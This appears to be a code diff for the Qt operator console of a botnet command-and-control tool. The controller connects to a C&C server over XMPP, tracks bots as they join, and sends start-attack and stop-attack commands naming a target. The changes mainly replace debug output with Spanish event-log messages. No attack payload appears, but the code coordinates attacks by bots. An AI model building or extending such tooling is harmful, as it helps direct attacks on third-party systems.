@@ -21,7 +21,6 @@
 #include <QCloseEvent>
 #include <QMessageBox>
 #include <QInputDialog>
-#include <QDebug>
 
 MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent)
 {
@@ -72,7 +71,11 @@ void MainWindow::startAttack()
     if(ok && !target.isEmpty()) {
         setAttackInProgress(true, Attack(_attack.id() + 1, target));
 
+        _centralWidget -> writeEvent(QString("Modo Ataque++"));
+
         _xmppClient -> sendCommand(StartAttackCommand(_attack.target(), _attack.id()));
+
+        _centralWidget -> writeEvent(QString("Enviado START_ATTACK_CMD [1:N]"));
     }
 }
 
@@ -86,7 +89,11 @@ void MainWindow::stopAttack()
     if(stop) {
         _xmppClient -> sendCommand(StopAttackCommand(_attack.id()));
 
+        _centralWidget -> writeEvent(QString("Enviado STOP_ATTACK_CMD [1:N]"));
+
         setAttackInProgress(false);
+
+        _centralWidget -> writeEvent(QString("Modo Ataque--"));
     }
 }
 
@@ -108,44 +115,62 @@ void MainWindow::about()
 
 void MainWindow::readyOnXmppClient()
 {
-    qDebug() << "Command && Control ready";
-
     setConnected(true);
     setAttackInProgress(false);
+
+    _centralWidget -> writeEvent(QString("Conectado a C&C como %1").arg(_xmppClient -> whoAmI()));
 }
 
 void MainWindow::disconnectedOnXmppClient()
 {
-    qDebug() << "Disconnected from server";
-
     setConnected(false);
     setAttackInProgress(false);
+
+    _centralWidget -> writeEvent(QString("Desconectado de C&C"));
 }
 
 void MainWindow::responseReceivedOnXmppClient(Message *response)
 {
-    qDebug() << "Response received from" << response -> from();
-
     if(BotStateResponse *botStateResponse = dynamic_cast<BotStateResponse *>(response)) {
         Bot *bot = new Bot(*botStateResponse -> bot());
+
         _centralWidget -> insertBot(botStateResponse -> from(), bot);
+
+        _centralWidget -> writeEvent(QString("Recibido BOT_STATE_RES [1:1] de %1").arg(botStateResponse -> from()));
 
         if(_attackInProgress && bot -> state() != AttackInProgress) {
             StartAttackCommand command(_attack.target(), _attack.id());
+
             command.setTo(botStateResponse -> from());
+
             _xmppClient -> sendCommand(command);
-            qDebug() << "Enviado comando para unirse a " << botStateResponse -> from();
+
+            _centralWidget -> writeEvent(QString("Enviado START_ATTACK_CMD [1:1] a %1").arg(botStateResponse -> from()));
         } else if(!_attackInProgress && bot -> state() == AttackInProgress) {
             setAttackInProgress(true, bot -> attack());
+
+            _centralWidget -> writeEvent(QString("Modo Ataque++ (Ataque en progreso en %1)").arg(botStateResponse -> from()));
+
+            _xmppClient -> sendCommand(StartAttackCommand(_attack.target(), _attack.id()));
+
+            _centralWidget -> writeEvent(QString("Enviado START_ATTACK_CMD [1:N]"));
         }
     } else if(dynamic_cast<AttackStartedResponse *>(response)) {
         Bot *bot = _centralWidget -> bot(response -> from());
+
         bot -> setState(AttackInProgress);
+
         _centralWidget -> modifyBot(response -> from());
+
+        _centralWidget -> writeEvent(QString("Recibido ATTACK_STARTED_RES [1:1] de %1").arg(response -> from()));
     } else if(dynamic_cast<AttackStoppedResponse *>(response)) {
         Bot *bot = _centralWidget -> bot(response -> from());
+
         bot -> setState(WaitingForCommand);
+
         _centralWidget -> modifyBot(response -> from());
+
+        _centralWidget -> writeEvent(QString("Recibido ATTACK_STOPPED_RES [1:1] de %1").arg(response -> from()));
     }
 
     delete response;
@@ -154,22 +179,22 @@ void MainWindow::responseReceivedOnXmppClient(Message *response)
 void MainWindow::botAddedOnXmppClient(const QString &roomId)
 {
     if(roomId != _xmppClient -> whoAmIOnRoom()) {
-        qDebug() << "Bot added:" << roomId;
-
         GetBotStateCommand command;
 
         command.setTo(roomId);
 
         _xmppClient -> sendCommand(command);
+
+        _centralWidget -> writeEvent(QString("Enviando GET_BOT_STATE_CMD [1:1] (Entrada %1)").arg(roomId));
     }
 }
 
 void MainWindow::botRemovedOnXmppClient(const QString &roomId)
 {
     if(roomId != _xmppClient -> whoAmIOnRoom()) {
-        qDebug() << "Bot removed:" << roomId;
-
         _centralWidget -> removeBot(roomId);
+
+        _centralWidget -> writeEvent(QString("Salida %1").arg(roomId));
     }
 }
 
@@ -282,7 +307,8 @@ void MainWindow::setConnected(bool connected)
     _centralWidget -> setEnabled(_connected);
     _connectToCCAction -> setEnabled(!_connected);
     _disconnectFromCCAction -> setEnabled(_connected);
-    _ccLabel -> setText(_connected ? tr("Conectado como %1").arg(_xmppClient -> configuration().jid()) : tr("Desconectado"));
+    _attackMenu -> setEnabled(_connected);
+    _ccLabel -> setText(_connected ? tr("Conectado %1").arg(_xmppClient -> whoAmI()) : tr("Desconectado"));
 }
 
 void MainWindow::setAttackInProgress(bool attackInProgress, const Attack& attack)
